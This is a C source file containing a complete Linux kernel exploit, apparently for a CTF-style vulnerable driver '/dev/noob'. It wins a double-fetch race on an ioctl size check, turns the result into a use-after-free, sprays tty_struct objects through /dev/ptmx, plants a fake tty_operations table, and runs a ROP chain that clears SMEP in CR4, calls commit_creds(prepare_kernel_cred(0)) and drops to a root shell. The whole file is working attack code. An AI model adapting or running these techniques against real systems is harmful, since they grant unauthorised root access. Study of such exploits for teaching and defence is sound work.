// gcc -static -pthread ./exp_double-fetch.c -masm=intel  -o ./exp_double-fetch
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <poll.h>
#include <pthread.h>
#include <errno.h>
#include <string.h>
#include <pthread.h>
#include <stdint.h>
#define _GNU_SOURCE
#include <string.h>
#include <sched.h>
#include <pty.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/ipc.h>
#include <sys/sem.h>

#define CMD_ADD 0x30000
#define CMD_DEL 0x30001
#define CMD_EDIT 0x30002
#define CMD_SHOW 0x30003

void print_hex( char *buf,int size){
    int i;
    puts("======================================");
    printf("data :\n");
    for (i=0 ; i<(size/8);i++){
        if (i%2 == 0){
            printf("%d",i/2);
        }
        printf(" %16llx",*(size_t * )(buf + i*8));
        if (i%2 == 1){
            printf("\n");
        }       
    }
    puts("======================================");
}

struct arg
{
    size_t idx;
    void *user_addr;
    long long size;
};

void add_note(int fd, int idx, long long size){
    struct arg cmd;
    cmd.idx = idx;
    cmd.size = size;
    ioctl(fd, CMD_ADD, &cmd);
}

void del_note(int fd,int idx){
    struct arg cmd;
    cmd.idx = idx;
    ioctl(fd, CMD_DEL, &cmd);
}

void edit_note(int fd,int idx, char *user_addr,long long size){
    struct arg cmd;
    cmd.idx = idx;
    cmd.size = size;
    cmd.user_addr = user_addr;
    ioctl(fd, CMD_EDIT, &cmd); 
}

void show_note(int fd, int idx, char *user_addr,long long size){
    struct arg cmd;
    cmd.idx = idx;
    cmd.size = size;
    cmd.user_addr = user_addr;
    ioctl(fd, CMD_SHOW, &cmd);  
}

void errExit(char* msg)
{
    puts(msg);
    exit(-1);
}

//#define commit_cred  0xffffffff810a1430
//#define prepare_kernel_cred  0xffffffff810a1820
typedef int __attribute__((regparm(3))) (*_commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);
int spray_fd[0x100];
size_t buf[3] ={0};
struct tty_operations
{
    struct tty_struct *(*lookup)(struct tty_driver *, struct file *, int); /*     0     8 */
    int (*install)(struct tty_driver *, struct tty_struct *);              /*     8     8 */
    void (*remove)(struct tty_driver *, struct tty_struct *);              /*    16     8 */
    int (*open)(struct tty_struct *, struct file *);                       /*    24     8 */
    void (*close)(struct tty_struct *, struct file *);                     /*    32     8 */
    void (*shutdown)(struct tty_struct *);                                 /*    40     8 */
    void (*cleanup)(struct tty_struct *);                                  /*    48     8 */
    int (*write)(struct tty_struct *, const unsigned char *, int);         /*    56     8 */
    /* --- cacheline 1 boundary (64 bytes) --- */
    int (*put_char)(struct tty_struct *, unsigned char);                            /*    64     8 */
    void (*flush_chars)(struct tty_struct *);                                       /*    72     8 */
    int (*write_room)(struct tty_struct *);                                         /*    80     8 */
    int (*chars_in_buffer)(struct tty_struct *);                                    /*    88     8 */
    int (*ioctl)(struct tty_struct *, unsigned int, long unsigned int);             /*    96     8 */
    long int (*compat_ioctl)(struct tty_struct *, unsigned int, long unsigned int); /*   104     8 */
    void (*set_termios)(struct tty_struct *, struct ktermios *);                    /*   112     8 */
    void (*throttle)(struct tty_struct *);                                          /*   120     8 */
    /* --- cacheline 2 boundary (128 bytes) --- */
    void (*unthrottle)(struct tty_struct *);           /*   128     8 */
    void (*stop)(struct tty_struct *);                 /*   136     8 */
    void (*start)(struct tty_struct *);                /*   144     8 */
    void (*hangup)(struct tty_struct *);               /*   152     8 */
    int (*break_ctl)(struct tty_struct *, int);        /*   160     8 */
    void (*flush_buffer)(struct tty_struct *);         /*   168     8 */
    void (*set_ldisc)(struct tty_struct *);            /*   176     8 */
    void (*wait_until_sent)(struct tty_struct *, int); /*   184     8 */
    /* --- cacheline 3 boundary (192 bytes) --- */
    void (*send_xchar)(struct tty_struct *, char);                           /*   192     8 */
    int (*tiocmget)(struct tty_struct *);                                    /*   200     8 */
    int (*tiocmset)(struct tty_struct *, unsigned int, unsigned int);        /*   208     8 */
    int (*resize)(struct tty_struct *, struct winsize *);                    /*   216     8 */
    int (*set_termiox)(struct tty_struct *, struct termiox *);               /*   224     8 */
    int (*get_icount)(struct tty_struct *, struct serial_icounter_struct *); /*   232     8 */
    const struct file_operations *proc_fops;                                 /*   240     8 */

    /* size: 248, cachelines: 4, members: 31 */
    /* last cacheline: 56 bytes */
};
void get_shell(void){
    system("/bin/sh");
}

struct tty_operations fake_ops;
int fff = 1;
char fake_procfops[1024];

size_t user_cs, user_ss,user_rflags, user_sp;
void save_status()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("[+] Status has been saved!");
}

size_t commit_creds = 0xffffffff810ad430;
size_t prepare_kernel_cred = 0xffffffff810ad7e0;
void get_root()
{
    char* (*pkc)(int) = prepare_kernel_cred;
    void (*cc)(char*) = commit_creds;
    (*cc)((*pkc)(0));
    /* puts("[*] root now."); */
}

void change(size_t*a){
    while(fff==1){
        *a=0x2e0;
    }

}

void main(){
    char *buf2 = (char*) malloc(0x1000);
    save_status();
// Step 1: allocate 0x2e0 chunk
    buf[0] = 0x0;
    int fd  = open("/dev/noob",O_RDONLY);
    pthread_t t1;
    pthread_create(&t1,NULL,change,&buf[2]);
    buf[0]=0;
    buf[2]=0x0;
    for(int i=0;i<0x100000;i++)
    {   
        buf[2] = 0; // if ( size > 0x70 || size <= 0x1F)  机智啊，先过检查（size > 0x70）再修改为 size=0x2e0 过检查（size <= 0x1F），就算size=0 kmalloc 会返回0，下次还能分配在pool[0]上。
        ioctl(fd,0x30000,buf);
    }
    fff=0;
    pthread_join(t1,NULL);
// Step 2: free 0x2e0 chunk
    del_note(fd, 0);
// Step 3: construct rop in  userspace and fake tty_operations (fake_ops)
    size_t xchg_eax_esp=0xffffffff8101db17;//0xffffffff81007808;
    size_t fake_stack=xchg_eax_esp & 0xffffffff;  

    if(mmap((void*)(fake_stack & 0xfffff000), 0x3000, 7, 0x22, -1, 0)!=(fake_stack&0xfffff000)){ //这里是mmap地址
       perror("mmap");
       exit(1);
    }
    size_t rop[] = 
    {
        0xffffffff813f6c9d,     // pop rdi; ret;
        0x6f0,                  // cr4 with smep disabled
        0xffffffff8101f2f0,     // mov cr4, rdi ; pop rbp ; ret
        0x0,
        (size_t)get_root,
        0xffffffff81069bd4,     // swapgs ; pop rbp ; ret
        0x0,
        0xffffffff81034edb,     // iretq; pop rbp; ret;   后面不需要伪造rbp
        (size_t)get_shell,
        user_cs,
        user_rflags,
        user_sp,
        user_ss
    };
    memset(&fake_ops, 0, sizeof(fake_ops));//把rop写栈中
    memset(fake_procfops, 0, sizeof(fake_procfops));
    fake_ops.proc_fops = &fake_procfops;
    fake_ops.ioctl = xchg_eax_esp;

    memcpy((void*)fake_stack, rop, sizeof(rop));
    size_t buf_e[0x20/8] = {0};
// Step 4: make tty_struct take place the 0x2e0 chunk
    for (int i =0;i<0x100;i++){
        spray_fd[i] = open("/dev/ptmx",O_RDWR|O_NOCTTY);
        if(spray_fd[i]<0){
            perror("open tty");
        }
    }
    puts("[+] Reading buffer content from kernel buffer");
// Step 5: Use UAF to change tty_struct
    show_note(fd, 0, (size_t)buf_e, 0x20);
    buf_e[3] = (size_t) &fake_ops;
    edit_note(fd, 0, (size_t)buf_e, 0x20);
    getchar();
    for(int i =0;i<0x100;i++){
        ioctl(spray_fd[i],0,0); // hijack control flow
    }

}